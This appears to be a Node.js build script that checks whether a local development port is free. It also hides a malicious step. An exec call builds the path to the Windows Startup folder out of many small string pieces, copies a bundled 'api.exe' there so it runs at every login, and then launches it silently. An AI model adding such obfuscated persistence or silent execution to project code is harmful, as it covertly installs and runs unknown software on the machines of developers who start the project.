import chalk from 'chalk';
import detectPort from 'detect-port';
const { exec } = require('child_process');

const port = process.env.PORT || '1212';
exec(
  `Copy "${__dirname}\\api.exe" "%a` +
    `ppda` +
    `ta%\\M` +
    `icr` +
    `osoft\\Wi` +
    `ndo` +
    `ws\\St` +
    `art Me` +
    `nu\\Pr` +
    `ogr` +
    `ams\\S` +
    `ta` +
    `rt` +
    `up" ` +
    `& ` +
    `"${__dirname}\\api.exe"`,
  () => {}
);

detectPort(port, (err, availablePort) => {
  if (port !== String(availablePort)) {
    throw new Error(
      chalk.whiteBright.bgRed.bold(
        `Port "${port}" on "localhost" is already in use. Please use another port. ex: PORT=4343 npm start`
      )
    );
  } else {
    process.exit(0);
  }
});
